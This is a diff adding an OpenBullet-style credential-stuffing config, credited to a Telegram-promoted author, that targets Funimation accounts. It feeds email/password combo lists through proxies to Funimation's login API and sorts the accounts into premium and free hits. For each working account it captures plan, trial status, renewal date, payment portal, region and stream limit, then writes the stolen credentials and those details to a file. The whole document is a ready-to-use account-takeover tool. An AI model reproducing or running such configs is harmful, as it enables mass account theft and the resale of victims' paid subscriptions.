@@ -1,0 +1,114 @@
+[SETTINGS]
+{
+  "Name": "Funimation😈Thelokojo",
+  "SuggestedBots": 129,
+  "MaxCPM": 0,
+  "LastModified": "2022-07-17T01:28:59.3679491-05:00",
+  "AdditionalInfo": "https://t.me/Thelokojovip",
+  "Author": "@Thelokojo_vip",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#USER FUNCTION URLEncode "<USER>" -> VAR "LOKURA" 
+
+REQUEST GET "https://www.funimation.com/log-in/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "input type=\"hidden\" name=\"csrfmiddlewaretoken\" value=\"" "\"" CreateEmpty=FALSE -> VAR "TOKEN1" 
+
+REQUEST POST "https://prod-api-funimationnow.dadcdigital.com/api/auth/login/" 
+  CONTENT "username=<LOKURA>&password=<PASS>" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "X-CSRFToken: <TOKEN1>" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Origin: https://www.funimation.com" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.funimation.com/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "success\":false" 
+    KEY "error\":\"User not found" 
+    KEY "Failed Authentication" 
+  KEYCHAIN Success OR 
+    KEY "premium" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "free" 
+    KEY "basic" 
+
+#LOKURA PARSE "<SOURCE>" LR "token\":\"" "\"," CreateEmpty=FALSE -> VAR "TOKEN2" 
+
+REQUEST GET "https://prod-api-funimationnow.dadcdigital.com/api/source/stripe/subscription/" 
+  
+  HEADER "Host: prod-api-funimationnow.dadcdigital.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0" 
+  HEADER "Accept: application/json" 
+  HEADER "Referer: https://www.funimation.com/" 
+  HEADER "Authorization: Token <TOKEN2>" 
+  HEADER "X-CSRFToken: <TOKEN2>" 
+  HEADER "Origin: https://www.funimation.com" 
+
+#TRIAL PARSE "<SOURCE>" LR "isTrialPeriod\":" ",\"" CreateEmpty=FALSE -> CAP "TRIAL" 
+
+#PLAN PARSE "<SOURCE>" LR "plan\":\"" "\"," CreateEmpty=FALSE -> CAP "PLAN" 
+
+#EXPIRACION PARSE "<SOURCE>" LR "renewDate\":\"" "@" CreateEmpty=FALSE -> CAP "EXPIRACION" 
+
+#METODO_DE_PAGO PARSE "<SOURCE>" LR "paymentPortal\":\"" "\"," CreateEmpty=FALSE -> CAP "METODO DE PAGO" 
+
+#REGION PARSE "<SOURCE>" LR "subscriptionRegion\":\"" "\"," CreateEmpty=FALSE -> CAP "paz" 
+
+#PANTALLAS PARSE "<SOURCE>" LR "streamLimit\":" ",\"" CreateEmpty=FALSE -> CAP "PANTALLAS" 
+
+UTILITY File "FUMINATION_THELOKOJO.txt" AppendLines "\\n<===========| FUMINATION THELOKOJO |===========>\\nCorreo: <USER>\\nContraseña: <PASS>\\nTRIAL: <TRIAL>\\nPLAN: <PLAN>\\nEXPIRACION: <EXPIRACION>\\nMETODO DE PAGO: <METODO DE PAGO>\\nREGION: <REGION>\\nPANTALLAS: <PANTALLAS>\\n" 
+
